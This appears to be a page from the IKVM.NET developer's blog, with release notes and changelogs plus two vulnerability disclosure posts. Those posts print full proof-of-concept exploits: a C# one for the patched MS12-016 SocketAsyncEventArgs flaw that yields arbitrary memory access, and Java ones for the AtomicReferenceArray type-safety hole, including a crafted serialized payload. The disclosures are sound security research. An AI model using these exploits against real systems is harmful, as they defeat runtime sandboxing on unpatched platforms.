		03/08/2012 14:35:51 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f8945e35-6f5e-4a0c-bd4b-c7c88fba4656"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f8945e35-6f5e-4a0c-bd4b-c7c88fba4656">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 04 March 2012</h2></div>
<div class="newsItems"><a name="aa1f9ddf2-d37f-44f4-a64c-d2d39dc0bb1e"></a><div class="entry">
	<h3 class="entryTitle">Lang.NEXT</h3>
	<div class="entryBody">
		<P>I'm looking forward to speaking at <A href="http://lambda-the-ultimate.org/node/4465">Lang.NEXT</A>. To be held at the Microsoft Campus on April 2 - 4.</P>
<P>If you're in the neighborhood and are interested in programming language design and implementation, this is your opportunity to find out if there really is such a thing as a free lunch.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/04/2012 11:15:02 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a1f9ddf2-d37f-44f4-a64c-d2d39dc0bb1e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a1f9ddf2-d37f-44f4-a64c-d2d39dc0bb1e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 27 February 2012</h2></div>
<div class="newsItems"><a name="a413fa3f3-bb9f-463b-a06c-6b37ac76cf3f"></a><div class="entry">
	<h3 class="entryTitle">MS12-016 Vulnerability Details</h3>
	<div class="entryBody">
		<P>Unlike most bugs that I run into, this one I actively went looking for. After being reminded of the cloning attack (in the context of Java) I wrote some reflection code to scan the <ACRONYM title=".NET Base Class Library">BCL</ACRONYM> for public types that are cloneable (i.e. subclassable) and contain unmanaged pointer fields. This is a bad combination. A class that showed up as potentially vulnerable was <A href="http://msdn.microsoft.com/en-us/library/system.net.sockets.socketasynceventargs.aspx">SocketAsyncEventArgs</A> and a few minutes with ildasm confirmed it.</P>
<P>I had at that time fairly recently written about another Socket vulnerability (that was fixed in <A HREF="/PermaLink.aspx?guid=4eb904a7-e81d-4340-8258-f23835441242">MS11-039</A>), but that was a complete coincidence. As I said this bug was found via (trivial) static analysis.</P>
<P>Here's an example exploit (not very reliable):</P><CODE>using System;<BR>using System.Net;<BR>using System.Net.Sockets;<BR><BR>class MySocketAsyncEventArgs : System.Net.Sockets.SocketAsyncEventArgs<BR>{<BR>&nbsp; public MySocketAsyncEventArgs Clone()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; return (MySocketAsyncEventArgs)MemberwiseClone();<BR>&nbsp; }<BR>}<BR><BR>class Program<BR>{<BR>&nbsp; static void Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; GC.Collect();<BR><BR>&nbsp;&nbsp;&nbsp; byte[] buf1 = new byte[1024];<BR>&nbsp;&nbsp;&nbsp; object[] dummy = new object[1024];<BR>&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; dummy.Length; i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dummy[i] = new byte[1024];<BR>&nbsp;&nbsp;&nbsp; byte[] buf2 = new byte[1];<BR>&nbsp;&nbsp;&nbsp; MySocketAsyncEventArgs args = new MySocketAsyncEventArgs();<BR>&nbsp;&nbsp;&nbsp; args.SetBuffer(buf1, 0, buf1.Length);<BR>&nbsp;&nbsp;&nbsp; MySocketAsyncEventArgs copy = args.Clone();<BR>&nbsp;&nbsp;&nbsp; args.Dispose();<BR>&nbsp;&nbsp;&nbsp; buf1 = null;<BR><BR>&nbsp;&nbsp;&nbsp; GC.Collect();<BR><BR>&nbsp;&nbsp;&nbsp; Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);<BR>&nbsp;&nbsp;&nbsp; server.Bind(new IPEndPoint(IPAddress.Loopback, 0));<BR>&nbsp;&nbsp;&nbsp; server.Listen(1);<BR>&nbsp;&nbsp;&nbsp; Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);<BR>&nbsp;&nbsp;&nbsp; client.Connect(server.LocalEndPoint);<BR>&nbsp;&nbsp;&nbsp; Socket conn = server.Accept();<BR><BR>&nbsp;&nbsp;&nbsp; byte[] buf = new byte[1024];<BR>&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; buf.Length; i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf[i] = 0xFF;<BR>&nbsp;&nbsp;&nbsp; client.Send(buf);<BR>&nbsp;&nbsp;&nbsp; conn.ReceiveAsync(copy);<BR>&nbsp;&nbsp;&nbsp; System.Threading.Thread.Sleep(100);<BR><BR>&nbsp;&nbsp;&nbsp; // now we have a magic array that allows us arbitrary memory access<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(buf2.Length);<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(buf2[1000000000]); // AccessViolation<BR><BR>&nbsp;&nbsp;&nbsp; GC.SuppressFinalize(copy);<BR>&nbsp; }<BR>}</CODE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/27/2012 08:58:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=413fa3f3-bb9f-463b-a06c-6b37ac76cf3f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=413fa3f3-bb9f-463b-a06c-6b37ac76cf3f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 23 February 2012</h2></div>
<div class="newsItems"><a name="acd48169a-9405-4f63-9087-798c4a1866d3"></a><div class="entry">
	<h3 class="entryTitle">February 2012 Java Critical Patch Update Vulnerability Details</h3>
	<div class="entryBody">
		<P>Last week, Oracle released the <A href="http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html">February 2012 Oracle Java SE Critical Patch Update</A>. This included <A href="http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/25e25dfd1b91">fixes</A> for two related problems I reported to them on August 1, 2011. The first problem is also what inspired the <A HREF="/PermaLink.aspx?guid=4527a953-90d5-4b87-bd93-90f71690142a">post about disabling the security manager</A>.</P>
<P>This is another one of those security vulnerabilities that I stumbled into without looking for it. When I was integrating OpenJDK 7, I merged some minor changes into <A href="http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/atomic/AtomicReferenceArray.html">AtomicReferenceArray</A> and after that a couple of JSR-166 TCK tests failed. After a little investigation I found that the problematic code was:</P><CODE>public AtomicReferenceArray(E[] array) {<BR>&nbsp;&nbsp;&nbsp; // Visibility guaranteed by final field guarantees<BR>&nbsp;&nbsp;&nbsp; this.array = array.clone();<BR>}</CODE> 
<P>One of the tests constructs the AtomicReferenceArray by passing in an java.lang.Integer array and a subsequent store in the array would fail on IKVM.NET, because the IKVM.NET implementation of AtomicReferenceArray.set() uses the ldelema instruction to get the address of the array element so it can subsequently do a volatile store to that location. When you use the ldelema instruction the CLR will do a type check to make sure the array can safely hold values of that type and this type check failed, because the code assumed that the array is always an object array, but in this case it was a java.lang.Integer array.</P>
<P>At first I simply fixed this by changing the constructor back to what it previously did (always allocate a new Object array), but after some reflection I realized that this might be a security issue.</P>
<P>To see why this could be a security issue, you need to know that HotSpot (Server) is capable of doing some pretty amazing optimizations. What I conjectured was that HotSpot might be able to inline the constructor and subsequent get operation and then optimize away a cast operation that follows the get operation. Here's an example:</P><CODE>AtomicReferenceArray ara = new AtomicReferenceArray(new Integer[1]);<BR>Integer value = (Integer)ara.get(0);</CODE>
<P>HotSpot Server is able to deduce is this case that the (Integer) cast is redundant. However, what it fails to take into account is that AtomicReferenceArray uses sun.misc.Unsafe to directly access the array and this means that even though the array here is of type Integer, the AtomicReferenceArray.set() method allows you to store any reference in the array. So a slightly modified version will violate type safety:</P><CODE>AtomicReferenceArray ara = new AtomicReferenceArray(new Integer[1]);<BR>ara.set(0, "foo");<BR>Integer value = (Integer)ara.get(0);</CODE> 
<P>Now value contains a string while being typed as Integer.</P>
<P>Here's a full working example (it's little bit more convoluted, because you need to coax HotSpot into fully optimizing the code):</P><CODE>import java.util.concurrent.atomic.*;<BR><BR>public class vuln<BR>{<BR>&nbsp; int field1;<BR>&nbsp; static volatile Object obj = new vuln();<BR>&nbsp; static volatile boolean done;<BR><BR>&nbsp; public static void main(String[] args) throws Exception<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; new Thread() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void run() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try { Thread.sleep(3000); } catch (Exception _) { }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; obj = "foo";<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("done");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try { Thread.sleep(30); } catch (Exception _) { }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done = true;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }.start();<BR>&nbsp;&nbsp;&nbsp; for (;;) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doIt();<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR><BR>&nbsp; static void doIt()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; AtomicReferenceArray r = new AtomicReferenceArray(new vuln[1]);<BR>&nbsp;&nbsp;&nbsp; r.set(0, obj);<BR>&nbsp;&nbsp;&nbsp; frob((vuln)r.get(0));<BR>&nbsp; }<BR><BR>&nbsp; static void frob(vuln v) {<BR>&nbsp;&nbsp;&nbsp; if (done) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(v.field1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v.field1 += 8;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("foo");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.exit(0);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</CODE> 
<P>This vulnerability was interesting to me because it required some pretty advanced HotSpot optimizations, but this also made it less of a real-world issue, because I was unable to get HotSpot Client VM to do these optimizations, so a browser running Java was not likely to be vulnerable. However, while I was preparing to report this to Oracle it occurred to me that there was a much bigger security vulnerability that had been lingering in AtomicReferenceArray since it was first introduced in Java 5. By manually constructing a serialized object graph you can stick any array you want into an AtomicReferenceArray instance and then use the AtomicReferenceArray.set() method to write an arbitrary reference to violate type safety.</P>
<P>Here's an example of that:</P><CODE>import java.io.*;<BR>import java.util.concurrent.atomic.*;<BR><BR>class Union1 { }<BR>class Union2 { }<BR><BR>public class test<BR>{<BR>&nbsp; static byte[] buf = new byte[] {<BR>&nbsp;&nbsp;&nbsp; -84, -19, 0, 5, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103,<BR>&nbsp;&nbsp;&nbsp; 46, 79, 98, 106, 101, 99, 116, 59, -112, -50, 88, -97, 16, 115, 41, 108, 2, 0,<BR>&nbsp;&nbsp;&nbsp; 0, 120, 112, 0, 0, 0, 2, 117, 114, 0, 9, 91, 76, 85, 110, 105, 111, 110, 49, 59,<BR>&nbsp;&nbsp;&nbsp; -2, 44, -108, 17, -120, -74, -27, -1, 2, 0, 0, 120, 112, 0, 0, 0, 1, 112, 115,<BR>&nbsp;&nbsp;&nbsp; 114, 0, 48, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117,<BR>&nbsp;&nbsp;&nbsp; 114, 114, 101, 110, 116, 46, 97, 116, 111, 109, 105, 99, 46, 65, 116, 111, 109,<BR>&nbsp;&nbsp;&nbsp; 105, 99, 82, 101, 102, 101, 114, 101, 110, 99, 101, 65, 114, 114, 97, 121, -87,<BR>&nbsp;&nbsp;&nbsp; -46, -34, -95, -66, 101, 96, 12, 2, 0, 1, 91, 0, 5, 97, 114, 114, 97, 121, 116,<BR>&nbsp;&nbsp;&nbsp; 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101,<BR>&nbsp;&nbsp;&nbsp; 99, 116, 59, 120, 112, 113, 0, 126, 0, 3<BR>&nbsp; };<BR><BR>&nbsp; public static void main(String[] args) throws Throwable<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(buf));<BR>&nbsp;&nbsp;&nbsp; Object[] arr = (Object[])ois.readObject();<BR>&nbsp;&nbsp;&nbsp; Union1[] u1 = (Union1[])arr[0];<BR>&nbsp;&nbsp;&nbsp; AtomicReferenceArray ara = (AtomicReferenceArray)arr[1];<BR>&nbsp;&nbsp;&nbsp; ara.set(0, new Union2());<BR>&nbsp;&nbsp;&nbsp; System.out.println(u1[0]);<BR>&nbsp; }<BR>}</CODE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/23/2012 13:45:55 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cd48169a-9405-4f63-9087-798c4a1866d3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cd48169a-9405-4f63-9087-798c4a1866d3">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 24 January 2012</h2></div>
<div class="newsItems"><a name="aa7daa45b-8d34-4fce-b922-fb29b4e7ad9c"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for a new snapshot. Not too many changes, but the IKVM.Reflection API changes should suggest what I've been working on.</P>
<P>Changes:</P>
<UL>
<LI>Updated version to 7.1.4406.0.</LI>
<LI>Handle Main-Class manifest value that spans multiple lines. Fix for bug #3461012.</LI>
<LI>When constructing a generic class loader we can't use GetWrapperFromType() on the type arguments, because they might refer to a subtype that is currently being loaded.</LI>
<LI>Made base TypeWrapper resolution lazy for compiled and .NET TypeWrappers.</LI>
<LI>Use modopt custom modifiers for methods instead of name mangling and NameSigAttribute.</LI>
<LI>Added version info resource to JVM.DLL. Modified version of patch #3472413.</LI>
<LI>Added version info resource to ikvm-native-win32-{arch}.dll. Modified version of patch #3472413.</LI>
<LI>Added support for delegates with ByRef parameters.</LI>
<LI>When a dynamic only interface method ends up being "implemented" by a static or non-public method, it should throw the appropriate exception.</LI>
<LI>When instantiating a delegate and the object passed in does not properly implement the delegate's Method interface, bind the delegate to an error stub that throws the appropriate error.</LI>
<LI>The right remap filename should be put in the SourceFileAttribute, instead of the last one.</LI>
<LI>Stack trace elements in methods in remapped .NET types should not list the source filename as map.xml.</LI>
<LI>IKVM.Reflection: FieldInfo.IsAssembly should test for FieldAttributes.Assembly access, not FieldAttributes.Family.</LI>
<LI>IKVM.Reflection: Added Module.__FileAlignment property.</LI>
<LI>IKVM.Reflection: Added ManifestResourceInfo.__Offset property.</LI>
<LI>IKVM.Reflection: Avoid the need for (expensive) ResolveMethod call when emitting debug symbols. Thanks to Miguel Garcia for pointing this out.</LI>
<LI>IKVM.Reflection: Add AssemblyName.__Hash property (to expose the hash in an AssemblyRef).</LI>
<LI>IKVM.Reflection: Added Module.__EntryPointRVA and Module.__EntryPointToken properties.</LI>
<LI>IKVM.Reflection: Added MethodBase.__MethodRVA property.</LI>
<LI>IKVM.Reflection: Fixed regression introduced with AssemblyName rewrite. The AssemblyName returned from __GetReferencedAssemblies() should include an empty public key token if the referenced assembly is not strong named.</LI>
<LI>IKVM.Reflection: API change. Allow Type.MetadataToken to be called on missing type (it will return 0 or the token hint when the type was forwarded).</LI>
<LI>IKVM.Reflection: Added Universe.ResolveType() API that can be used to construct missing types.</LI>
<LI>IKVM.Reflection: Fixed various Module.Resolve* methods to throw proper exception when wrong metadata token is supplied.</LI>
<LI>IKVM.Reflection: Fixed type parameter binding for missing types.</LI>
<LI>IKVM.Reflection: Added Module.__EnumerateCustomAttributeTable() API.</LI>
<LI>IKVM.Reflection: Removed Module.__GetDeclarativeSecurityFor() API.</LI>
<LI>IKVM.Reflection: Added CustomAttributeData.__Parent API.</LI>
<LI>IKVM.Reflection: Added Module.__ImageRuntimeVersion API.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4406.zip">ikvmbin-7.1.4406.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/24/2012 13:48:53 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a7daa45b-8d34-4fce-b922-fb29b4e7ad9c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a7daa45b-8d34-4fce-b922-fb29b4e7ad9c">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 03 January 2012</h2></div>
<div class="newsItems"><a name="ab759e708-8588-4066-a9bb-9f83069fc6bd"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.0 Update 1 Release Candidate 0</h3>
	<div class="entryBody">
		<P>A couple of annoying bugs have been reported since 7.0 was released, so I decided to do an update.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 7.0.4335.1.</LI>
<LI>FileStore for non-accessible drive should throw exception when trying to create the FileStore, not when accessing the name() or type() properties.</LI>
<LI>Graphics2D.clip(null) should only throw NPE for a Component graphics.</LI>
<LI>Don't crash when ikvmc -resource: or -externalresource: option doesn't contain an = sign.</LI>
<LI>Handle Main-Class manifest value that spans multiple lines. Fix for bug #3461012.</LI>
<LI>Informational messages should not be treated as error when -warnaserror is specified. Fix for #3443377.</LI>
<LI>Don't enforce pre-1.5 class name rules in ikvmc (since HotSpot doesn't enforce any naming rules for classes loaded by the system (and boot) class loader, by default). Fix for #3443373.</LI>
<LI>Fix for #3441959.</LI>
<LI>Throwable.addSuppressed() didn't have a proper parameter name.</LI>
<LI>Mark getSpace0 with SecuritySafeCritical to avoid getting an exception with .NET 4</LI>
<LI>Bug fix. Removed incorrect check for uninitialized objects on backward branch.</LI>
<LI>Don't crash when ikvmc -resource: or -externalresource: option doesn't contain an = sign.</LI>
<LI>Added AssemblyInformationalVersionAttribute to OpenJDK assemblies (to set the "Product Version"). Part of patch #3458997.</LI>
<LI>Include copyright and metadata in IKVM.OpenJDK.Tools.dll. Part of patch #3458997.</LI>
<LI>Bug fix. Don't call Finish on unloadable TypeWrapper.</LI>
<LI>Bug fix. When constructing a generic class loader we can't use GetWrapperFromType() on the type arguments, because they might refer to a subtype that is currently being loaded.</LI>
<LI>Fix. When decoding a NameSigAttribute it is possible that a type does not exist (i.e. is an unloadable) and that results in a warning emitted against the referenced assemblies class loader.</LI>
<LI>Suppress annotation custom attributes when enumerating inner classes.</LI>
<LI>IKVM.Reflection: Bug fix. FieldInfo.IsAssembly should test for FieldAttributes.Assembly access, not FieldAttributes.Family.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4335.1.zip">ikvmbin-7.0.4335.1.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.0.4335.1.zip">ikvmsrc-7.0.4335.1.zip</A>, <A href="http://www.frijters.net/openjdk7-b147-stripped.zip">openjdk7-b147-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/03/2012 13:24:44 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b759e708-8588-4066-a9bb-9f83069fc6bd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b759e708-8588-4066-a9bb-9f83069fc6bd">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 21 December 2011</h2></div>
<div class="newsItems"><a name="a863d521d-a792-45a3-b32f-c323db25c2a4"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.46 Update 1 Release Candidate 0</h3>
	<div class="entryBody">
		<P>IKVM.NET 0.46 is the last OpenJDK 6 based release, so it will be supported longer than usual. I haven't yet decided how long exactly, but in any case here is a release candidate for an update release that incorporates many of the fixes that have been done since 0.46 was released.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.46.0.2.</LI>
<LI>Bug fix. TypeWrapper.IsAssignableTo() didn't handle arrays with primitive elements properly.</LI>
<LI>Bug fix. Exception blocks inside potential try { } finally { } blocks were not handled correctly. Could result in finally blocks that run multiple times (when an exception occurs).</LI>
<LI>Fix for #3404229.</LI>
<LI>Bug fix. Don't create a miranda method if the class already has a static method with the same signature.</LI>
<LI>Added workaround for another x64 JIT bug. See https://sourceforge.net/mailarchive/message.php?msg_id=28250469</LI>
<LI>Newer versions of ICSharpCode.SharpZipLib.dll require the ZipEntry size to be set explicitly, otherwise the generated archive will not be compatible with older zip implementations (like Java 6's java.util.zip).</LI>
<LI>Fixed serialization interop bugs.</LI>
<LI>Bug fix. When an abstract .NET type implements System.IComparable (and hence java.lang.Comparable) the resulting stub is not usable from Java because the compareTo method is missing. This fix adds the missing method.</LI>
<LI>Fix and enhancement. When a .NET type implements a shadowed interface, we now also publish the original interface (e.g. if the .NET type implements System.IComparable, Java code will now see java.lang.Comparable and System.IComparable). In addition, the new code makes sure that when a .NET type explicitly implements both System.IComparable and java.lang.Comparable that the Java code will not see java.lang.Comparable twice.</LI>
<LI>Bug fix. Make FileOutputStream in append mode always append.</LI>
<LI>Add support for overriding constructor body in map.xml.</LI>
<LI>Make sure that Thread.getContextClassLoader() and Thread.setContextClassLoader() are JITed before Thread.isCCLOverridden().</LI>
<LI>Workaround .NET 2.0 bug in GetType() that could cause problems with creating proxies for compiled types.</LI>
<LI>Bug fix. Exceptions declared with ThrowsAttribute(Type) (in .NET code) did not get exported properly by ikvmstub.</LI>
<LI>Fix ClassLoader.findLoadedClass0() to handle null string.</LI>
<LI>Implemented support for annotation defaults in ikvmstub.</LI>
<LI>Bug fix. Final instance fields that have a type 2 access property should also have a (private) setter for reflection and serialization.</LI>
<LI>Bug fix. Set os.name and os.version properties correctly when running on unknown Windows version (Windows 8).</LI>
<LI>Bug fix. IPInterfaceProperties.GetIPv_Properties() can throw an exception (and does so on Win 8 for some interfaces).</LI>
<LI>Don't open the remap file in read/write mode.</LI>
<LI>Bug fix. Make sure sun.misc.Launcher is initialized before setting a security manager, because Launcher assumes there is no security manager yet.</LI>
<LI>Implemented com.sun.security.auth.module.NTSystem.getCurrent().</LI>
<LI>Bug fix. When calling a final method on a remapped type we can't call the instance method in the remapped type, but we have to call the instancehelper instead.</LI>
<LI>Fix. When decoding a NameSigAttribute it is possible that a type does not exist (i.e. is an unloadable) and that results in a warning emitted against the referenced assemblies class loader.</LI>
<LI>Bug fix. Removed incorrect verifier check for uninitialized objects on backward branch.</LI>
<LI>Handle Main-Class manifest value that spans multiple lines. Fix for bug #3461012.</LI>
<LI>Retain reflection field ordering for ikvmc compiled code (not required by spec, but to improve compatibility with broken code).</LI>
<LI>Don't use "slow path" for field reflection on remapped types (as getting a Throwable field from cli.System.Exception will cause an exception, but the slow path will generate a different exception).</LI>
<LI>Backported the new method override resolution code.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.46.0.2.zip">ikvmbin-0.46.0.2.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.46.0.2.zip">ikvmsrc-0.46.0.2.zip</A>, <A href="http://www.frijters.net/openjdk6-b22-stripped.zip">openjdk6-b22-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/21/2011 09:54:46 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=863d521d-a792-45a3-b32f-c323db25c2a4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=863d521d-a792-45a3-b32f-c323db25c2a4">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 19 December 2011</h2></div>
<div class="newsItems"><a name="aa0623e1e-8dd9-43a5-9097-d7014a2dfb7d"></a><div class="entry">
	<h3 class="entryTitle">Accessibility, Visibility and Transparency</h3>
	<div class="entryBody">
		<P>There are a couple of subtle differences between the JVM and CLR with respect to member accessibility. For example, the JVM will allow you to access public members in non-public base classes:</P>
<P><CODE>package p1;<BR><BR>class Base {<BR>&nbsp;&nbsp;&nbsp; public int foo;<BR>}<BR><BR>public class Derived extends Base {<BR>}<BR><BR>package p2;<BR><BR>class Test {<BR>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p1.Derived d = new p1.Derived();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d.foo = 42;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</CODE></P>
<P>If you compile p1 and p2 seperately with ikvmc and look inside the resulting assemblies, you'll see that ikvmc generated a foo property in Derived. It needs to do this, because the CLR won't allow code from another assembly to access the members of Base.</P>
<P>In the IKVM source code this type of access stubs is known as type 1. As you'd expect there are also type 2 access stubs. These are generated when a public (or protected) member exposes a non-public type:</P>
<P><CODE>package p1;<BR><BR>class Foo { }<BR><BR>public class Bar {<BR>&nbsp; public Foo field = new Foo();<BR>}<BR><BR>package p2;<BR><BR>class Test {<BR>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p1.Bar b = new p1.Bar();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(b.field);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b.field = null;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</CODE></P>
<P>Once again, if you compile p1 and p2 into separate assemblies with ikvmc, you'll see that field will be accessed through a property. In this case the property type is erased to the first public base type and a custom modifier is attached to make sure the property signature is unique (and to be able to recover the real type).</P>
<P>These type 2 access stubs were originally generated (in some cases) by ikvmc to support accessing these members from C#, because the CLR, like the JVM, doesn't care about the visibility of the types in a signature when it considers member accessibility.</P>
<P>However, since .NET 4.0 there is a new factor to consider, when <A href="http://msdn.microsoft.com/en-us/library/ee191569.aspx">level 2 transparent code</A>&nbsp; tries to access a member, the types in the member signature (except for the custom modifiers) must all be visible to the caller.</P>
<P>I have not seen this last fact documented anywhere yet.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/19/2011 11:57:13 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a0623e1e-8dd9-43a5-9097-d7014a2dfb7d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a0623e1e-8dd9-43a5-9097-d7014a2dfb7d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 16 December 2011</h2></div>
<div class="newsItems"><a name="a39c2a950-9f73-4823-853b-28ecf4e15ca4"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've been doing some cleanup and refactoring and in the process removed some limitations and fixed a bunch of corner cases.</P>
<P>Changes:</P>
<UL>
<LI>Updated version to 7.1.4366.0. 
<LI>Fixed Class.getDeclaredClasses() to throw correct exception when one on the inner classes cannot be loaded. 
<LI>Removed class name length limitation. 
<LI>Split ikvmc compilation into three passes to support classes that extend a class nested inside itself. 
